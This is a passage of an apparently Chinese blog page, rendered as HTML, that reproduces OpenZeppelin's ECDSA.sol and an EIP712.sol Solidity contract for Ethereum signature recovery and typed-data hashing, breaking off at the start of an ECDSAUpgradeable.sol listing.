class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ECDSA-sol（签名）"><a href="#ECDSA-sol（签名）" class="headerlink" title="ECDSA.sol（签名）"></a>ECDSA.sol（签名）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.8.0) (utils/cryptography/ECDSA.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;../Strings.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * These functions can be used to verify that a message was signed by the holder</span></span><br><span class="line"><span class="comment"> * of the private keys of a given address.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library ECDSA &#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">RecoverError</span> &#123;</span></span><br><span class="line">        NoError,</span><br><span class="line">        InvalidSignature,</span><br><span class="line">        InvalidSignatureLength,</span><br><span class="line">        InvalidSignatureS,</span><br><span class="line">        InvalidSignatureV <span class="comment">// Deprecated in v4.8</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _throwError(RecoverError error) private pure &#123;</span><br><span class="line">        <span class="keyword">if</span> (error == RecoverError.NoError) &#123;</span><br><span class="line">            <span class="keyword">return</span>; <span class="comment">// no error: do nothing</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignature) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignatureLength) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature length&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignatureS) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature &#x27;s&#x27; value&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the address that signed a hashed message (`hash`) with</span></span><br><span class="line"><span class="comment">     * `signature` or error string. This address can then be used for verification purposes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `ecrecover` EVM opcode allows for malleable (non-unique) signatures:</span></span><br><span class="line"><span class="comment">     * this function rejects them by requiring the `s` value to be in the lower</span></span><br><span class="line"><span class="comment">     * half order, and the `v` value to be either 27 or 28.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * IMPORTANT: `hash` _must_ be the result of a hash operation for the</span></span><br><span class="line"><span class="comment">     * verification to be secure: it is possible to craft signatures that</span></span><br><span class="line"><span class="comment">     * recover to arbitrary addresses for non-hashed data. A safe way to ensure</span></span><br><span class="line"><span class="comment">     * this is by receiving a hash of the original message (which may otherwise</span></span><br><span class="line"><span class="comment">     * be too long), and then calling &#123;toEthSignedMessageHash&#125; on it.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Documentation for signature generation:</span></span><br><span class="line"><span class="comment">     * - with https://web3js.readthedocs.io/en/v1.3.4/web3-eth-accounts.html#sign[Web3.js]</span></span><br><span class="line"><span class="comment">     * - with https://docs.ethers.io/v5/api/signer/#Signer-signMessage[ethers]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(bytes32 hash, bytes memory signature)</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (signature.length == <span class="number">65</span>) &#123;</span><br><span class="line">            bytes32 r;</span><br><span class="line">            bytes32 s;</span><br><span class="line">            uint8 v;</span><br><span class="line">            <span class="comment">// ecrecover takes the signature parameters, and the only way to get them</span></span><br><span class="line">            <span class="comment">// currently is to use assembly.</span></span><br><span class="line">            <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">            assembly &#123;</span><br><span class="line">                r := mload(add(signature, <span class="number">0x20</span>))</span><br><span class="line">                s := mload(add(signature, <span class="number">0x40</span>))</span><br><span class="line">                v := byte(<span class="number">0</span>, mload(add(signature, <span class="number">0x60</span>)))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tryRecover(hash, v, r, s);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignatureLength);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the address that signed a hashed message (`hash`) with</span></span><br><span class="line"><span class="comment">     * `signature`. This address can then be used for verification purposes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `ecrecover` EVM opcode allows for malleable (non-unique) signatures:</span></span><br><span class="line"><span class="comment">     * this function rejects them by requiring the `s` value to be in the lower</span></span><br><span class="line"><span class="comment">     * half order, and the `v` value to be either 27 or 28.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * IMPORTANT: `hash` _must_ be the result of a hash operation for the</span></span><br><span class="line"><span class="comment">     * verification to be secure: it is possible to craft signatures that</span></span><br><span class="line"><span class="comment">     * recover to arbitrary addresses for non-hashed data. A safe way to ensure</span></span><br><span class="line"><span class="comment">     * this is by receiving a hash of the original message (which may otherwise</span></span><br><span class="line"><span class="comment">     * be too long), and then calling &#123;toEthSignedMessageHash&#125; on it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 hash, bytes memory signature)</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, signature);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-tryRecover&#125; that receives the `r` and `vs` short-signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See https://eips.ethereum.org/EIPS/eip-2098[EIP-2098 short signatures]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(bytes32 hash, bytes32 r, bytes32 vs)</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        bytes32 s = vs &amp; bytes32(<span class="number">0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>);</span><br><span class="line">        uint8 v = uint8((uint256(vs) &gt;&gt; <span class="number">255</span>) + <span class="number">27</span>);</span><br><span class="line">        <span class="keyword">return</span> tryRecover(hash, v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-recover&#125; that receives the `r and `vs` short-signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.2._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 hash, bytes32 r, bytes32 vs)</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, r, vs);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-tryRecover&#125; that receives the `v`,</span></span><br><span class="line"><span class="comment">     * `r` and `s` signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(bytes32 hash, uint8 v, bytes32 r, bytes32 s)</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        <span class="comment">// EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature</span></span><br><span class="line">        <span class="comment">// unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines</span></span><br><span class="line">        <span class="comment">// the valid range for s in (301): 0 &lt; s &lt; secp256k1n ÷ 2 + 1, and for v in (302): v ∈ &#123;27, 28&#125;. Most</span></span><br><span class="line">        <span class="comment">// signatures from current libraries generate a unique signature with an s-value in the lower half order.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value</span></span><br><span class="line">        <span class="comment">// with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or</span></span><br><span class="line">        <span class="comment">// vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept</span></span><br><span class="line">        <span class="comment">// these malleable signatures as well.</span></span><br><span class="line">        <span class="keyword">if</span> (uint256(s) &gt; <span class="number">0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignatureS);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the signature is valid (and not malleable), return the signer address</span></span><br><span class="line">        address signer = ecrecover(hash, v, r, s);</span><br><span class="line">        <span class="keyword">if</span> (signer == address(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignature);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (signer, RecoverError.NoError);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-recover&#125; that receives the `v`,</span></span><br><span class="line"><span class="comment">     * `r` and `s` signature fields separately.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 hash, uint8 v, bytes32 r, bytes32 s)</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Message, created from a `hash`. This</span></span><br><span class="line"><span class="comment">     * produces hash corresponding to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-191.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toEthSignedMessageHash</span><span class="params">(bytes32 hash)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="comment">// 32 is the length in bytes of hash,</span></span><br><span class="line">        <span class="comment">// enforced by the type signature above</span></span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n32&quot;</span>, hash));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Message, created from `s`. This</span></span><br><span class="line"><span class="comment">     * produces hash corresponding to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-191.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toEthSignedMessageHash</span><span class="params">(bytes memory s)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n&quot;</span>, Strings.toString(s.length), s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Typed Data, created from a</span></span><br><span class="line"><span class="comment">     * `domainSeparator` and a `structHash`. This produces hash corresponding</span></span><br><span class="line"><span class="comment">     * to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eips.ethereum.org/EIPS/eip-712[`eth_signTypedData`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-712.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toTypedDataHash</span><span class="params">(bytes32 domainSeparator, bytes32 structHash)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19\x01&quot;</span>, domainSeparator, structHash));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EIP712-sol（签名）"><a href="#EIP712-sol（签名）" class="headerlink" title="EIP712.sol（签名）"></a>EIP712.sol（签名）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev https://eips.ethereum.org/EIPS/eip-712[EIP 712] is a standard for hashing and signing of typed structured data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The encoding specified in the EIP is very generic, and such a generic implementation in Solidity is not feasible,</span></span><br><span class="line"><span class="comment"> * thus this contract does not implement the encoding itself. Protocols need to implement the type-specific encoding</span></span><br><span class="line"><span class="comment"> * they need in their contracts using a combination of `abi.encode` and `keccak256`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This contract implements the EIP 712 domain separator (&#123;_domainSeparatorV4&#125;) that is used as part of the encoding</span></span><br><span class="line"><span class="comment"> * scheme, and the final step of the encoding to obtain the message digest that is then signed via ECDSA</span></span><br><span class="line"><span class="comment"> * (&#123;_hashTypedDataV4&#125;).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The implementation of the domain separator was designed to be as efficient as possible while still properly updating</span></span><br><span class="line"><span class="comment"> * the chain id to protect against replay attacks on an eventual fork of the chain.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> This contract implements the version of the encoding known as &quot;v4&quot;, as implemented by the JSON RPC method</span></span><br><span class="line"><span class="comment"> * https://docs.metamask.io/guide/signing-data.html[`eth_signTypedDataV4` in MetaMask].</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * _Available since v3.4._</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">abstract contract EIP712 &#123;</span><br><span class="line">    <span class="comment">/* solhint-disable var-name-mixedcase */</span></span><br><span class="line">    <span class="comment">// Cache the domain separator as an immutable value, but also store the chain id that it corresponds to, in order to</span></span><br><span class="line">    <span class="comment">// invalidate the cached domain separator if the chain id changes.</span></span><br><span class="line">    bytes32 private immutable _CACHED_DOMAIN_SEPARATOR;</span><br><span class="line">    uint256 private immutable _CACHED_CHAIN_ID;</span><br><span class="line"></span><br><span class="line">    bytes32 private immutable _HASHED_NAME;</span><br><span class="line">    bytes32 private immutable _HASHED_VERSION;</span><br><span class="line">    bytes32 private immutable _TYPE_HASH;</span><br><span class="line">    <span class="comment">/* solhint-enable var-name-mixedcase */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Initializes the domain separator and parameter caches.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The meaning of `name` and `version` is specified in</span></span><br><span class="line"><span class="comment">     * https://eips.ethereum.org/EIPS/eip-712#definition-of-domainseparator[EIP 712]:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - `name`: the user readable name of the signing domain, i.e. the name of the DApp or the protocol.</span></span><br><span class="line"><span class="comment">     * - `version`: the current major version of the signing domain.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">NOTE:</span> These parameters cannot be changed except through a xref:learn::upgrading-smart-contracts.adoc[smart</span></span><br><span class="line"><span class="comment">     * contract upgrade].</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    constructor(<span class="built_in">string</span> memory name, <span class="built_in">string</span> memory version) &#123;</span><br><span class="line">        bytes32 hashedName = keccak256(bytes(name));</span><br><span class="line">        bytes32 hashedVersion = keccak256(bytes(version));</span><br><span class="line">        bytes32 typeHash = keccak256(<span class="string">&quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&quot;</span>);</span><br><span class="line">        _HASHED_NAME = hashedName;</span><br><span class="line">        _HASHED_VERSION = hashedVersion;</span><br><span class="line">        _CACHED_CHAIN_ID = block.chainid;</span><br><span class="line">        _CACHED_DOMAIN_SEPARATOR = _buildDomainSeparator(typeHash, hashedName, hashedVersion);</span><br><span class="line">        _TYPE_HASH = typeHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the domain separator for the current chain.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function _domainSeparatorV4() internal view <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (block.chainid == _CACHED_CHAIN_ID) &#123;</span><br><span class="line">            <span class="keyword">return</span> _CACHED_DOMAIN_SEPARATOR;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> _buildDomainSeparator(_TYPE_HASH, _HASHED_NAME, _HASHED_VERSION);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _buildDomainSeparator(bytes32 typeHash, bytes32 name, bytes32 version) private view <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(</span><br><span class="line">            abi.encode(</span><br><span class="line">                typeHash,</span><br><span class="line">                name,</span><br><span class="line">                version,</span><br><span class="line">                block.chainid,</span><br><span class="line">                address(this)</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Given an already https://eips.ethereum.org/EIPS/eip-712#definition-of-hashstruct[hashed struct], this</span></span><br><span class="line"><span class="comment">     * function returns the hash of the fully encoded EIP712 message for this domain.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * This hash can be used together with &#123;ECDSA-recover&#125; to obtain the signer of a message. For example:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * ```solidity</span></span><br><span class="line"><span class="comment">     * bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(</span></span><br><span class="line"><span class="comment">     *     keccak256(&quot;Mail(address to,string contents)&quot;),</span></span><br><span class="line"><span class="comment">     *     mailTo,</span></span><br><span class="line"><span class="comment">     *     keccak256(bytes(mailContents))</span></span><br><span class="line"><span class="comment">     * )));</span></span><br><span class="line"><span class="comment">     * address signer = ECDSA.recover(digest, signature);</span></span><br><span class="line"><span class="comment">     * ```</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function _hashTypedDataV4(bytes32 structHash) internal view virtual <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19\x01&quot;</span>, _domainSeparatorV4(), structHash));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ECDSAUpgradeable-sol-签名"><a href="#ECDSAUpgradeable-sol-签名" class="headerlink" title="ECDSAUpgradeable.sol (签名)"></a>ECDSAUpgradeable.sol (签名)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 